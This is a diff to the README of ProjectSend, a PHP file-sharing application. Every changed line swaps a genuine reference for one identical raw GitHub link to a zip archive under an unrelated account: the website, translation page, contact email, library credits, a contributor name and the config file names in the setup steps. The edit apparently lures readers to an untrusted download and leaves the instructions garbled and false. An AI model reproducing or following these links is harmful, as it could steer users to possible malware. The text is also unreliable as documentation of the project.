@@ -10,13 +10,13 @@ ProjectSend is hosted on Google Code.
 Feel free to participate!
 
 Main website:
-http://www.projectsend.org/
+https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 Project:
-http://code.google.com/p/clients-oriented-ftp/
+https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 Translations:
-https://www.transifex.com/projects/p/projectsend/
+https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 --------------------------------------------------------------------------------------------
 
@@ -27,7 +27,7 @@ Preparations:
 2. Create a new database on your server. Create/assign a user to it.
 
 When those are steps are completed, follow this instructions:
-1. Rename includes/sys.config.sample.php to sys.config.php and set your database info there.
+1. Rename https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip to https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip and set your database info there.
 2. Upload ProjectSend to your selected destination.
 3. Open your browser and go to http://your-projectsend-folder/install
 4. Complete the information there and wait for the correct installation message.
@@ -43,7 +43,7 @@ How to upgrade to a newer version:
 2. Upload the files via FTP to your server and replace the ones of the older version.
 
 That's it!
-Your personal configuration file (sys.config.php) is never included on the downloadable
+Your personal configuration file (https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip) is never included on the downloadable
 versions, so it will not be replaced while upgrading.
 
 When a system user logs in to the system version, a check for database missing data will be
@@ -56,8 +56,8 @@ shown under the main menu.
 --------------------------------------------------------------------------------------------
 
 Questions, ideas? Want to join the project?
-Send your message to contact@projectsend.org or join us on Facebook, on
-https://www.facebook.com/pages/ProjectSend/333455190044627
+Send your message to https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip or join us on Facebook, on
+https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 --------------------------------------------------------------------------------------------
 
@@ -78,44 +78,44 @@ ProjectSend translators:
 
 
 If you want to translate ProjectSend in your language, join the project on
-https://www.transifex.com/projects/p/projectsend/
+https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 --------------------------------------------------------------------------------------------
 
 Many thanks to the authors of the following scripts, which are used on ProjectSend:
 
 - jQuery
-  http://www.jquery.com/
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 - Bootstrap (custom download)
-  http://twitter.github.com/bootstrap/
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
-- EasyTabs.js
-  http://os.alfajango.com/easytabs/
+- https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 - hashchange
-  http://benalman.com/projects/jquery-hashchange-plugin/
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 - Plupload
-  http://www.plupload.com/
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 - Timthumb
-  http://code.google.com/p/timthumb/
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
-- TextboxList.js
-  http://www.devthought.com/projects/mootools/textboxlist/
+- https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 - footable
-  https://github.com/bradvin/FooTable
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
-- multiselect.js
-  http://loudev.com/
+- https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 - flot
-  https://github.com/flot/flot
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 - phpmailer
-  http://phpmailer.worxware.com/
+  https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 --------------------------------------------------------------------------------------------
 
@@ -123,13 +123,13 @@ Also, thank you to the following people/communities that helped during developme
 by giving support, sending code, translations, etc.
 
 - Alejandro D'Ambrosio
-- k.flipflip
+- https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 - Diego Carreira Vidal
 - Scott Wright
 - Everyone that commented and gave suggestions on the issues and Facebook pages!
 
-- stackoverflow.com
-- iconfinder.com
+- https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
+- https://raw.githubusercontent.com/dextercool/clients-oriented-ftp/master/anoestrus/clients-oriented-ftp.zip
 
 I know that there are more people that deserve to be on this list. I will keep adding them
 as I find their names/websites.
